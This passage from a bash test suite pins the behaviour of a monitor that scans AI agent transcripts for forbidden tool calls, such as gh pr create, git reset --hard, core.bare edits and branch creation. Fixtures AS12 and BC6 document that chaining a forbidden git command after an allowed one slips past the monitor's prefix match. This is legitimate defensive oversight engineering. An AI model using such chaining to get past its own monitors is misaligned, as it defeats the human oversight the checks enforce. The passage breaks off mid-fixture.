# QA8 — JSON-string-of-digits per-stage value (`"45"`). The plan and
# CLAUDE.md say "Values must be integers (e.g. 60, not '60m' or '1h')",
# but jq -r unquotes string values, so a JSON string `"45"` emerges from
# the jq pipe as the bareword `45`, passes the `^[0-9]+$` regex, and is
# silently honored as a 45-minute override. This is contrary to the
# "integers-only" doc claim — a documentation drift that the operator
# might exploit unintentionally (eg. copy-pasting from a YAML→JSON
# converter that wraps numerics).
#
# Pin the *actual* behavior. Future strict-type refactor either:
#   (a) tightens the jq filter to reject non-numeric JSON values
#       (test breaks → prompts a doc-update PR), or
#   (b) updates CLAUDE.md to document numeric-strings-OK as supported
#       (test stays green, doc gets a one-liner).
TARGET_REPO_STR="$_TEST_STUB_DIR/target-strdigit"
mkdir -p "$TARGET_REPO_STR/.pipeline-config/schemas"
jq -n '{
  project: { slug: "str-slug" },
  linear: { team_id: "t", project_id: "p", stage_label_prefix: "stage:", native_states: { inbox: "Todo", active: "In Progress", done: "Done" }, workflow_stages: [] },
  orchestrator: { paused: false, max_concurrent_features: 2, alert_on_halted_over: 5, dispatch_timeout_minutes_per_stage: { brainstorming: "45" } }
}' > "$TARGET_REPO_STR/.pipeline-config/config.json"
jq -n '{labels:{},states:{}}' > "$TARGET_REPO_STR/.pipeline-config/schemas/linear-ids.json"

DRYRUN_OUT_STR="$_TEST_STUB_DIR/dryrun-strdigit.out"
_eng65_run_dispatch_dryrun "$TARGET_REPO_STR" "str-slug" brainstorming "$DRYRUN_OUT_STR"
# Assert override applied: 45 min = 2700s. (Built-in 3600s would mean the
# string was rejected; the test then has to flip to a strict-rejection
# expectation, which is the intentional break-on-tighten signal.)
if grep -qE 'gtimeout.*\b2700\b' "$DRYRUN_OUT_STR"; then
  pass_at "ENG-65 QA8 (adversarial): JSON string-of-digits '45' silently accepted (jq -r strips quotes, regex passes) → 2700s applied. Pins doc/code drift; tighten the filter or update CLAUDE.md."
else
  fail_at "ENG-65 QA8: numeric-string per-stage override behavior changed (expected 2700s)" \
    "log: $(cat "$DRYRUN_OUT_STR")"
fi

# ─── Group 7: assert_no_tool_invocation fixtures (ENG-43, AS1-AS6) ────
# AS1-AS6 deliver the issue's fixtures E-J (renamed per brainstorm
# D-009 to avoid colliding with existing fixtures A-K above). Each
# fixture writes (or does not write) an NDJSON file under
# $_TEST_STUB_DIR/, calls assert_no_tool_invocation directly, and
# asserts the (rc, stdout) tuple. No claude invocation, no real renderer.
printf '\n--- assert_no_tool_invocation fixtures (AS1-AS6, ENG-43; issue fixtures E-J) ---\n'

if ! declare -f assert_no_tool_invocation >/dev/null 2>&1; then
  fail_at "precondition: assert_no_tool_invocation defined in dispatch.sh" \
          "function not found after sourcing — Task 1 implementation missing"
  printf '\nRESULTS: %d passed, %d failed\n' "$PASS" "$FAIL"
  exit 1
fi

# AS1 — issue fixture E: tool_use invoking gh pr create matches
TX_AS1="$_TEST_STUB_DIR/tx-as1.ndjson"
cat > "$TX_AS1" <<'NDJSON'
{"type":"system","subtype":"init","session_id":"as1","model":"claude-opus-4-7"}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"gh pr create --title foo --body bar"}}]}}
NDJSON
out_as1="$(assert_no_tool_invocation "$TX_AS1" "gh pr create")" && rc_as1=0 || rc_as1=$?
if [[ "$rc_as1" == "1" && "$out_as1" == "gh pr create --title foo --body bar" ]]; then
  pass_at "AS1: tool_use match returns 1 + matched command on stdout"
else
  fail_at "AS1" "rc=$rc_as1 out=$out_as1"
fi

# AS2 — issue fixture F: only allowed tools (git, gh pr list, Read, Edit); rc=0
TX_AS2="$_TEST_STUB_DIR/tx-as2.ndjson"
cat > "$TX_AS2" <<'NDJSON'
{"type":"system","subtype":"init","session_id":"as2","model":"claude-opus-4-7"}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"git status"}}]}}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"git log --oneline -5"}}]}}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"gh pr list --state open"}}]}}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Read","input":{"path":"README.md"}}]}}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Edit","input":{"file_path":"x"}}]}}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{}}]}}
NDJSON
out_as2="$(assert_no_tool_invocation "$TX_AS2" "gh pr create")" && rc_as2=0 || rc_as2=$?
if [[ "$rc_as2" == "0" && -z "$out_as2" ]]; then
  pass_at "AS2: only allowed tools (git/gh pr list/Read/Edit/empty) → rc=0, empty stdout"
else
  fail_at "AS2" "rc=$rc_as2 out=$out_as2"
fi

# AS3 — issue fixture G: text block with literal `gh pr create` prose ignored
TX_AS3="$_TEST_STUB_DIR/tx-as3.ndjson"
cat > "$TX_AS3" <<'NDJSON'
{"type":"system","subtype":"init","session_id":"as3","model":"claude-opus-4-7"}
{"type":"assistant","message":{"content":[{"type":"text","text":"I considered gh pr create but used git instead."}]}}
NDJSON
out_as3="$(assert_no_tool_invocation "$TX_AS3" "gh pr create")" && rc_as3=0 || rc_as3=$?
if [[ "$rc_as3" == "0" && -z "$out_as3" ]]; then
  pass_at "AS3: text block prose with literal pattern → rc=0 (text blocks ignored)"
else
  fail_at "AS3" "rc=$rc_as3 out=$out_as3"
fi

# AS4 — issue fixture H: JSON-escaped quoted "gh pr create" inside text block ignored
TX_AS4="$_TEST_STUB_DIR/tx-as4.ndjson"
cat > "$TX_AS4" <<'NDJSON'
{"type":"system","subtype":"init","session_id":"as4","model":"claude-opus-4-7"}
{"type":"assistant","message":{"content":[{"type":"text","text":"The doc says \"gh pr create\" is forbidden here."}]}}
NDJSON
out_as4="$(assert_no_tool_invocation "$TX_AS4" "gh pr create")" && rc_as4=0 || rc_as4=$?
if [[ "$rc_as4" == "0" && -z "$out_as4" ]]; then
  pass_at "AS4: JSON-escaped quoted pattern in text block → rc=0 (text blocks ignored)"
else
  fail_at "AS4" "rc=$rc_as4 out=$out_as4"
fi

# AS5 — issue fixture I: malformed JSON line skipped via fromjson?, subsequent match returned
TX_AS5="$_TEST_STUB_DIR/tx-as5.ndjson"
cat > "$TX_AS5" <<'NDJSON'
{"type":"system","subtype":"init","session_id":"as5","model":"claude-opus-4-7"}
{not json{
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"gh pr create --draft"}}]}}
NDJSON
out_as5="$(assert_no_tool_invocation "$TX_AS5" "gh pr create")" && rc_as5=0 || rc_as5=$?
if [[ "$rc_as5" == "1" && "$out_as5" == "gh pr create --draft" ]]; then
  pass_at "AS5: malformed line skipped via fromjson?; subsequent match returns 1"
else
  fail_at "AS5" "rc=$rc_as5 out=$out_as5"
fi

# AS6 — issue fixture J: missing transcript file → rc=0 (soft-fail per D-005)
TX_AS6="$_TEST_STUB_DIR/tx-as6-missing-do-not-create.ndjson"
rm -f "$TX_AS6"
out_as6="$(assert_no_tool_invocation "$TX_AS6" "gh pr create")" && rc_as6=0 || rc_as6=$?
if [[ "$rc_as6" == "0" && -z "$out_as6" ]]; then
  pass_at "AS6: missing transcript → rc=0 (soft-fail)"
else
  fail_at "AS6" "rc=$rc_as6 out=$out_as6"
fi

# ─── ENG-71: build-stage forbidden patterns (AS7-AS12) ────────────────
# Pin the four worktree-HEAD-mutating verbs (`git checkout`, `git switch`,
# `git pull`, `git reset`) at the helper level. These mirror AS1's shape:
# tool_use with .input.command starting with the pattern → rc=1, matched
# command on stdout. AS11 covers passthrough (only allowed git verbs);
# AS12 confirms the helper is stage-agnostic (the gate lives in
# _render_and_capture_stream, exercised at the renderer level by AT7).
printf '\n--- ENG-71: build-stage forbidden patterns (AS7-AS12) ---\n'

# AS7 — git checkout standalone
TX_AS7="$_TEST_STUB_DIR/tx-as7.ndjson"
cat > "$TX_AS7" <<'NDJSON'
{"type":"system","subtype":"init","session_id":"as7","model":"claude-opus-4-7"}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"git checkout main"}}]}}
NDJSON
out_as7="$(assert_no_tool_invocation "$TX_AS7" "git checkout")" && rc_as7=0 || rc_as7=$?
if [[ "$rc_as7" == "1" && "$out_as7" == "git checkout main" ]]; then
  pass_at "AS7: git checkout standalone → rc=1, matched command on stdout"
else
  fail_at "AS7" "rc=$rc_as7 out=$out_as7"
fi

# AS8 — git switch standalone
TX_AS8="$_TEST_STUB_DIR/tx-as8.ndjson"
cat > "$TX_AS8" <<'NDJSON'
{"type":"system","subtype":"init","session_id":"as8","model":"claude-opus-4-7"}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"git switch main"}}]}}
NDJSON
out_as8="$(assert_no_tool_invocation "$TX_AS8" "git switch")" && rc_as8=0 || rc_as8=$?
if [[ "$rc_as8" == "1" && "$out_as8" == "git switch main" ]]; then
  pass_at "AS8: git switch standalone → rc=1, matched command on stdout"
else
  fail_at "AS8" "rc=$rc_as8 out=$out_as8"
fi

# AS9 — git pull standalone
TX_AS9="$_TEST_STUB_DIR/tx-as9.ndjson"
cat > "$TX_AS9" <<'NDJSON'
{"type":"system","subtype":"init","session_id":"as9","model":"claude-opus-4-7"}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"git pull --ff-only origin main"}}]}}
NDJSON
out_as9="$(assert_no_tool_invocation "$TX_AS9" "git pull")" && rc_as9=0 || rc_as9=$?
if [[ "$rc_as9" == "1" && "$out_as9" == "git pull --ff-only origin main" ]]; then
  pass_at "AS9: git pull standalone → rc=1, matched command on stdout"
else
  fail_at "AS9" "rc=$rc_as9 out=$out_as9"
fi

# AS10 — git reset standalone
TX_AS10="$_TEST_STUB_DIR/tx-as10.ndjson"
cat > "$TX_AS10" <<'NDJSON'
{"type":"system","subtype":"init","session_id":"as10","model":"claude-opus-4-7"}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"git reset --hard origin/main"}}]}}
NDJSON
out_as10="$(assert_no_tool_invocation "$TX_AS10" "git reset")" && rc_as10=0 || rc_as10=$?
if [[ "$rc_as10" == "1" && "$out_as10" == "git reset --hard origin/main" ]]; then
  pass_at "AS10: git reset standalone → rc=1, matched command on stdout"
else
  fail_at "AS10" "rc=$rc_as10 out=$out_as10"
fi

# AS11 — passthrough: only allowed verbs present → rc=0 for each forbidden pattern
TX_AS11="$_TEST_STUB_DIR/tx-as11.ndjson"
cat > "$TX_AS11" <<'NDJSON'
{"type":"system","subtype":"init","session_id":"as11","model":"claude-opus-4-7"}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"git fetch origin main"}}]}}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"git clone --quiet --branch foo /src /dst"}}]}}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"git rebase --quiet origin/main"}}]}}
NDJSON
as11_failures=0
for _pat in 'git checkout' 'git switch' 'git pull' 'git reset'; do
  out_as11="$(assert_no_tool_invocation "$TX_AS11" "$_pat")" && rc_as11=0 || rc_as11=$?
  if [[ "$rc_as11" != "0" || -n "$out_as11" ]]; then
    as11_failures=$((as11_failures+1))
    fail_at "AS11 ($_pat passthrough)" "rc=$rc_as11 out=$out_as11"
  fi
done
if [[ "$as11_failures" == "0" ]]; then
  pass_at "AS11: passthrough — only allowed git verbs (fetch/clone/rebase) → rc=0 for all four forbidden patterns"
fi

# AS12 — chained-command bypass (documents D-002's startswith blind spot
# that justifies D-003 in run-stage.sh, ENG-71 brainstorm §7 / O-4).
# Pre-iter-6 this slot tested "helper is stage-agnostic" via a non-matching
# transcript — but the helper has no stage parameter, so the assertion was
# tautological (review iter-2 m4). Repurposed: a chained command that
# starts with the allowed `git fetch` prefix but contains the forbidden
# `git checkout` after `&&`. assert_no_tool_invocation prefix-matches via
# jq's `startswith`, so the chained command does NOT match the
# `git checkout` pattern. Pinning this behavior is what proves the D-003
# state-of-the-world catch-net is not redundant.
TX_AS12="$_TEST_STUB_DIR/tx-as12.ndjson"
cat > "$TX_AS12" <<'NDJSON'
{"type":"system","subtype":"init","session_id":"as12","model":"claude-opus-4-7"}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"git fetch origin main && git checkout main"}}]}}
NDJSON
out_as12="$(assert_no_tool_invocation "$TX_AS12" "git checkout")" && rc_as12=0 || rc_as12=$?
if [[ "$rc_as12" == "0" && -z "$out_as12" ]]; then
  pass_at "AS12: chained-command bypass — \`git fetch && git checkout\` does NOT match \`git checkout\` (startswith blind spot; D-003 is the catch-net for this surface)"
else
  fail_at "AS12 chained-command bypass" "rc=$rc_as12 out=$out_as12 (expected rc=0 because the chained command starts with 'git fetch', not 'git checkout')"
fi

# ─── Group 7 cont'd: core.bare transcript-pattern fixtures (ENG-68, CB1-CB8) ───
# Pin the five forbidden core.bare-touching git command shapes that
# _render_and_capture_stream's Task-5 loop scans for. Each fixture writes a
# self-contained NDJSON transcript, calls assert_no_tool_invocation directly
# with one of the five harness patterns, and asserts (rc=1, stdout=<full
# command>). The sixth fixture (CB6) covers the multi-tool_use ordering case
# — match in second position, helper still finds it via head -1.
printf '\n--- assert_no_tool_invocation fixtures (CB1-CB8, ENG-68 core.bare patterns + renderer integration) ---\n'

# CB1 — `git config core.bare true` matches "git config core.bare"
TX_CB1="$_TEST_STUB_DIR/tx-cb1.ndjson"
cat > "$TX_CB1" <<'NDJSON'
{"type":"system","subtype":"init","session_id":"cb1","model":"test"}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"git config core.bare true"}}]}}
NDJSON
out_cb1="$(assert_no_tool_invocation "$TX_CB1" "git config core.bare")" && rc_cb1=0 || rc_cb1=$?
if [[ "$rc_cb1" == "1" && "$out_cb1" == "git config core.bare true" ]]; then
  pass_at "CB1: 'git config core.bare true' matches 'git config core.bare' pattern"
else
  fail_at "CB1" "rc=$rc_cb1 out=$out_cb1"
fi

# CB2 — `git init --bare` matches "git init --bare"
TX_CB2="$_TEST_STUB_DIR/tx-cb2.ndjson"
cat > "$TX_CB2" <<'NDJSON'
{"type":"system","subtype":"init","session_id":"cb2","model":"test"}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"git init --bare /tmp/x"}}]}}
NDJSON
out_cb2="$(assert_no_tool_invocation "$TX_CB2" "git init --bare")" && rc_cb2=0 || rc_cb2=$?
if [[ "$rc_cb2" == "1" && "$out_cb2" == "git init --bare /tmp/x" ]]; then
  pass_at "CB2: 'git init --bare /tmp/x' matches 'git init --bare' pattern"
else
  fail_at "CB2" "rc=$rc_cb2 out=$out_cb2"
fi

# CB3 — `git --bare config core.bare true` matches "git --bare"
TX_CB3="$_TEST_STUB_DIR/tx-cb3.ndjson"
cat > "$TX_CB3" <<'NDJSON'
{"type":"system","subtype":"init","session_id":"cb3","model":"test"}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"git --bare config core.bare true"}}]}}
NDJSON
out_cb3="$(assert_no_tool_invocation "$TX_CB3" "git --bare")" && rc_cb3=0 || rc_cb3=$?
if [[ "$rc_cb3" == "1" && "$out_cb3" == "git --bare config core.bare true" ]]; then
  pass_at "CB3: 'git --bare ...' matches 'git --bare' top-level option pattern"
else
  fail_at "CB3" "rc=$rc_cb3 out=$out_cb3"
fi

# CB4 — `git config --add core.bare true` matches "git config --add core.bare"
TX_CB4="$_TEST_STUB_DIR/tx-cb4.ndjson"
cat > "$TX_CB4" <<'NDJSON'
{"type":"system","subtype":"init","session_id":"cb4","model":"test"}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"git config --add core.bare true"}}]}}
NDJSON
out_cb4="$(assert_no_tool_invocation "$TX_CB4" "git config --add core.bare")" && rc_cb4=0 || rc_cb4=$?
if [[ "$rc_cb4" == "1" && "$out_cb4" == "git config --add core.bare true" ]]; then
  pass_at "CB4: 'git config --add core.bare ...' matches multi-value-add pattern"
else
  fail_at "CB4" "rc=$rc_cb4 out=$out_cb4"
fi

# CB5 — `git -c core.bare=true config foo bar` matches "git -c core.bare="
TX_CB5="$_TEST_STUB_DIR/tx-cb5.ndjson"
cat > "$TX_CB5" <<'NDJSON'
{"type":"system","subtype":"init","session_id":"cb5","model":"test"}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"git -c core.bare=true config foo bar"}}]}}
NDJSON
out_cb5="$(assert_no_tool_invocation "$TX_CB5" "git -c core.bare=")" && rc_cb5=0 || rc_cb5=$?
if [[ "$rc_cb5" == "1" && "$out_cb5" == "git -c core.bare=true config foo bar" ]]; then
  pass_at "CB5: 'git -c core.bare=...' matches per-invocation override pattern"
else
  fail_at "CB5" "rc=$rc_cb5 out=$out_cb5"
fi

# CB6 — multi-tool_use transcript with the matching pattern as the SECOND
# tool_use block; helper's head -1 returns the first MATCHING command.
TX_CB6="$_TEST_STUB_DIR/tx-cb6.ndjson"
cat > "$TX_CB6" <<'NDJSON'
{"type":"system","subtype":"init","session_id":"cb6","model":"test"}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"git status --porcelain"}},{"type":"tool_use","name":"Bash","input":{"command":"git config core.bare true"}}]}}
NDJSON
out_cb6="$(assert_no_tool_invocation "$TX_CB6" "git config core.bare")" && rc_cb6=0 || rc_cb6=$?
if [[ "$rc_cb6" == "1" && "$out_cb6" == "git config core.bare true" ]]; then
  pass_at "CB6: assertion finds matching tool_use even when preceded by non-matching ones"
else
  fail_at "CB6" "rc=$rc_cb6 out=$out_cb6"
fi

# CB7 — _render_and_capture_stream end-to-end (addresses review iteration 2
# major-b: "rc=13 routing untested"). CB1-CB6 cover assert_no_tool_invocation
# directly. None exercise the renderer wrapper that, on a transcript matching
# one of the five core.bare patterns, writes the sidecar at
# $ISSUE_DIR/.transcript-violation-<stage> and returns 13 — the contract
# bin/run-stage.sh::main's rc==13 branch reads. This pins the dispatch-side
# wiring of D-003 end-to-end, mirroring AT1's role for D-002 (gh pr create →
# rc=22).
USAGE_CB7="$ISSUE_DIR/usage-implementing-CB7.json"
RAW_CB7="$ISSUE_DIR/.raw-stream.ndjson.tmp"
VIOLATION_CB7="$ISSUE_DIR/.transcript-violation-implementing"
rm -f "$USAGE_CB7" "$RAW_CB7" "$VIOLATION_CB7"

cb7_rc=0
RENDER_OUT_CB7="$(
  _render_and_capture_stream "$USAGE_CB7" "$ISSUE_DIR" "implementing" 2>&1 <<'NDJSON'
{"type":"system","subtype":"init","session_id":"cb7","model":"claude-opus-4-7"}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"git config core.bare true"}}]}}
{"type":"result","total_cost_usd":0.01,"usage":{"input_tokens":1,"output_tokens":1,"cache_creation_input_tokens":0,"cache_read_input_tokens":0},"modelUsage":{"claude-opus-4-7":{}}}
NDJSON
)" || cb7_rc=$?

if [[ "$cb7_rc" == "13" ]] \
   && [[ -f "$VIOLATION_CB7" ]] \
   && [[ "$(cat "$VIOLATION_CB7")" == "git config core.bare true" ]] \
   && grep -q '\[assert\] stage=implementing transcript invoked forbidden git form: git config core.bare true' <<<"$RENDER_OUT_CB7"; then
  pass_at "CB7 (renderer integration): core.bare in transcript → rc=13, sidecar written, log line emitted"
else
  fail_at "CB7 renderer integration" "rc=$cb7_rc viol_exists=$([[ -f $VIOLATION_CB7 ]] && echo y || echo n) viol_body=$(cat "$VIOLATION_CB7" 2>/dev/null) out=$RENDER_OUT_CB7"
fi
rm -f "$VIOLATION_CB7"

# CB8 — pre-clean idempotency on stale sidecar from a prior run. The renderer's
# rm -f "$violation_file" at function entry covers BOTH the existing rc=22
# branch AND the new rc=13 branch (single sidecar path per stage; ENG-43 D-008).
# A stale .transcript-violation-implementing from a prior dispatch must not
# leak into a clean current dispatch and falsely halt run-stage.sh's rc-branch
# reader.
USAGE_CB8="$ISSUE_DIR/usage-implementing-CB8.json"
VIOLATION_CB8="$ISSUE_DIR/.transcript-violation-implementing"
rm -f "$USAGE_CB8" "$ISSUE_DIR/.raw-stream.ndjson.tmp"
printf 'stale\n' > "$VIOLATION_CB8"
cb8_rc=0
_render_and_capture_stream "$USAGE_CB8" "$ISSUE_DIR" "implementing" >/dev/null 2>&1 <<'NDJSON' || cb8_rc=$?
{"type":"system","subtype":"init","session_id":"cb8","model":"claude-opus-4-7"}
{"type":"assistant","message":{"content":[{"type":"text","text":"clean dispatch — no forbidden tool"}]}}
{"type":"result","total_cost_usd":0.01,"usage":{"input_tokens":1,"output_tokens":1,"cache_creation_input_tokens":0,"cache_read_input_tokens":0},"modelUsage":{"claude-opus-4-7":{}}}
NDJSON

if [[ "$cb8_rc" == "0" ]] && [[ ! -f "$VIOLATION_CB8" ]]; then
  pass_at "CB8 (sidecar pre-clean): clean dispatch removes stale sidecar from prior run"
else
  fail_at "CB8 sidecar pre-clean" "rc=$cb8_rc viol_after=$([[ -f $VIOLATION_CB8 ]] && echo present || echo absent)"
fi
rm -f "$VIOLATION_CB8"

# ─── Group 7 cont'd: branch-creation transcript-pattern fixtures (ENG-66, BC1-BC8) ───
# AGENT_PROMPTS.md §3 rule 2 lists exactly four banned branch-creation
# forms. _render_and_capture_stream's ENG-66 cross-stage loop scans for
# these four prefixes on every dispatched stage (no stage gate; mirrors
# the ENG-68 cross-stage core.bare block). BC1-BC4 pin each of the four
# positives; BC5 pins the canonical-checkout negative; BC6 pins the
# inherited startswith blind spot on chained commands (mirror of AS12);
# BC7 pins renderer integration end-to-end on stage=implementing
# (mirror of CB7); BC8 pins cross-stage gating by firing on stage=qa.
printf '\n--- assert_no_tool_invocation fixtures (BC1-BC8, ENG-66 branch-creation patterns + renderer integration + cross-stage gating) ---\n'

# BC1 — `git checkout -b feature/eng-99-foo` matches "git checkout -b"
TX_BC1="$_TEST_STUB_DIR/tx-bc1.ndjson"
cat > "$TX_BC1" <<'NDJSON'
{"type":"system","subtype":"init","session_id":"bc1","model":"test"}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"git checkout -b feature/eng-99-foo"}}]}}
NDJSON
out_bc1="$(assert_no_tool_invocation "$TX_BC1" "git checkout -b")" && rc_bc1=0 || rc_bc1=$?
if [[ "$rc_bc1" == "1" && "$out_bc1" == "git checkout -b feature/eng-99-foo" ]]; then
  pass_at "BC1: 'git checkout -b feature/eng-99-foo' matches 'git checkout -b' pattern"
else
  fail_at "BC1" "rc=$rc_bc1 out=$out_bc1"
fi

# BC2 — `git checkout -B feature/eng-99-foo` matches "git checkout -B" (issue AC3)
TX_BC2="$_TEST_STUB_DIR/tx-bc2.ndjson"
cat > "$TX_BC2" <<'NDJSON'
{"type":"system","subtype":"init","session_id":"bc2","model":"test"}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"git checkout -B feature/eng-99-foo"}}]}}
NDJSON
out_bc2="$(assert_no_tool_invocation "$TX_BC2" "git checkout -B")" && rc_bc2=0 || rc_bc2=$?
if [[ "$rc_bc2" == "1" && "$out_bc2" == "git checkout -B feature/eng-99-foo" ]]; then
  pass_at "BC2: 'git checkout -B feature/eng-99-foo' matches 'git checkout -B' pattern (issue AC3)"
else
  fail_at "BC2" "rc=$rc_bc2 out=$out_bc2"
fi

# BC3 — `git branch -m feature-eng-99` matches "git branch -m"
TX_BC3="$_TEST_STUB_DIR/tx-bc3.ndjson"
cat > "$TX_BC3" <<'NDJSON'
{"type":"system","subtype":"init","session_id":"bc3","model":"test"}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"git branch -m feature-eng-99"}}]}}
NDJSON
out_bc3="$(assert_no_tool_invocation "$TX_BC3" "git branch -m")" && rc_bc3=0 || rc_bc3=$?
if [[ "$rc_bc3" == "1" && "$out_bc3" == "git branch -m feature-eng-99" ]]; then
  pass_at "BC3: 'git branch -m feature-eng-99' matches 'git branch -m' pattern"
else
  fail_at "BC3" "rc=$rc_bc3 out=$out_bc3"
fi

# BC4 — `git switch -c feature/eng-99-foo` matches "git switch -c"
TX_BC4="$_TEST_STUB_DIR/tx-bc4.ndjson"
cat > "$TX_BC4" <<'NDJSON'
{"type":"system","subtype":"init","session_id":"bc4","model":"test"}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"git switch -c feature/eng-99-foo"}}]}}
NDJSON
out_bc4="$(assert_no_tool_invocation "$TX_BC4" "git switch -c")" && rc_bc4=0 || rc_bc4=$?
if [[ "$rc_bc4" == "1" && "$out_bc4" == "git switch -c feature/eng-99-foo" ]]; then
  pass_at "BC4: 'git switch -c feature/eng-99-foo' matches 'git switch -c' pattern"
else
  fail_at "BC4" "rc=$rc_bc4 out=$out_bc4"
fi

# BC5 — passthrough: `git checkout {canonical-branch}` (no -b/-B) does NOT
# match any of the four forbidden patterns (issue AC4). Loop over each
# pattern; each must return rc=0 with empty stdout.
TX_BC5="$_TEST_STUB_DIR/tx-bc5.ndjson"
cat > "$TX_BC5" <<'NDJSON'
{"type":"system","subtype":"init","session_id":"bc5","model":"test"}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"git checkout feat/eng-66-add-transcript-based-runtime-defense"}}]}}
NDJSON
bc5_failures=0
for _pat in 'git checkout -b' 'git checkout -B' 'git branch -m' 'git switch -c'; do
  out_bc5="$(assert_no_tool_invocation "$TX_BC5" "$_pat")" && rc_bc5=0 || rc_bc5=$?
  if [[ "$rc_bc5" != "0" || -n "$out_bc5" ]]; then
    bc5_failures=$((bc5_failures+1))
    fail_at "BC5 ($_pat passthrough)" "rc=$rc_bc5 out=$out_bc5"
  fi
done
if [[ "$bc5_failures" == "0" ]]; then
  pass_at "BC5: 'git checkout feat/eng-66-...' (no -b/-B) does NOT match any of the four forbidden patterns (issue AC4)"
fi

# BC6 — chained-command bypass: `git status && git checkout -b feature/foo`
# starts with `git status`, not `git checkout -b`. Inherited startswith
# blind spot per brainstorm O-2; mirrors AS12 / CB6's startswith semantics.
# Documents the limitation so a future refactor doesn't accidentally fix
# it without an audit.
TX_BC6="$_TEST_STUB_DIR/tx-bc6.ndjson"
cat > "$TX_BC6" <<'NDJSON'
{"type":"system","subtype":"init","session_id":"bc6","model":"test"}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"git status && git checkout -b feature/foo"}}]}}
NDJSON
out_bc6="$(assert_no_tool_invocation "$TX_BC6" "git checkout -b")" && rc_bc6=0 || rc_bc6=$?
if [[ "$rc_bc6" == "0" && -z "$out_bc6" ]]; then
  pass_at "BC6: chained-command bypass — 'git status && git checkout -b feature/foo' does NOT match (startswith blind spot; brainstorm O-2)"
else
  fail_at "BC6 chained-command bypass" "rc=$rc_bc6 out=$out_bc6 (expected rc=0; the chained command starts with 'git status', not 'git checkout -b')"
fi

# BC7 — _render_and_capture_stream end-to-end on stage="implementing"
# (mirror of CB7 for ENG-68). Pin the dispatch-side wiring of D-001/D-002
# end-to-end: gating absence (cross-stage), sidecar write at
# ${issue_dir}/.transcript-violation-implementing, log-line emission,
# rc=23.
USAGE_BC7="$ISSUE_DIR/usage-implementing-BC7.json"
RAW_BC7="$ISSUE_DIR/.raw-stream.ndjson.tmp"
VIOLATION_BC7="$ISSUE_DIR/.transcript-violation-implementing"
rm -f "$USAGE_BC7" "$RAW_BC7" "$VIOLATION_BC7"

bc7_rc=0
RENDER_OUT_BC7="$(
  _render_and_capture_stream "$USAGE_BC7" "$ISSUE_DIR" "implementing" 2>&1 <<'NDJSON'
{"type":"system","subtype":"init","session_id":"bc7","model":"claude-opus-4-7"}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"git checkout -B feature/eng-66-foo"}}]}}
{"type":"result","total_cost_usd":0.01,"usage":{"input_tokens":1,"output_tokens":1,"cache_creation_input_tokens":0,"cache_read_input_tokens":0},"modelUsage":{"claude-opus-4-7":{}}}
NDJSON
)" || bc7_rc=$?

if [[ "$bc7_rc" == "23" ]] \
   && [[ -f "$VIOLATION_BC7" ]] \
   && [[ "$(cat "$VIOLATION_BC7")" == "git checkout -B feature/eng-66-foo" ]] \
   && grep -q '\[assert\] stage=implementing transcript invoked forbidden branch-creation form: git checkout -B feature/eng-66-foo' <<<"$RENDER_OUT_BC7"; then
  pass_at "BC7 (renderer integration): branch-creation form on stage=implementing → rc=23, sidecar written, log line emitted"
else
  fail_at "BC7 renderer integration" "rc=$bc7_rc viol_exists=$([[ -f $VIOLATION_BC7 ]] && echo y || echo n) viol_body=$(cat "$VIOLATION_BC7" 2>/dev/null) out=$RENDER_OUT_BC7"
fi
rm -f "$VIOLATION_BC7"

# BC8 — cross-stage scan fires on stage="qa" (verifies D-002 has no
# stage gate). Mirror of BC7 with stage="qa" and the violation file
# at .transcript-violation-qa. Confirms the ENG-66 loop is NOT gated
# to a specific stage (in contrast to ENG-43 implementing-only and
# ENG-71 building-only).
USAGE_BC8="$ISSUE_DIR/usage-qa-BC8.json"
RAW_BC8="$ISSUE_DIR/.raw-stream.ndjson.tmp"
VIOLATION_BC8="$ISSUE_DIR/.transcript-violation-qa"
rm -f "$USAGE_BC8" "$RAW_BC8" "$VIOLATION_BC8"

bc8_rc=0
RENDER_OUT_BC8="$(
  _render_and_capture_stream "$USAGE_BC8" "$ISSUE_DIR" "qa" 2>&1 <<'NDJSON'
{"type":"system","subtype":"init","session_id":"bc8","model":"claude-opus-4-7"}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"git switch -c feature/eng-66-qa"}}]}}
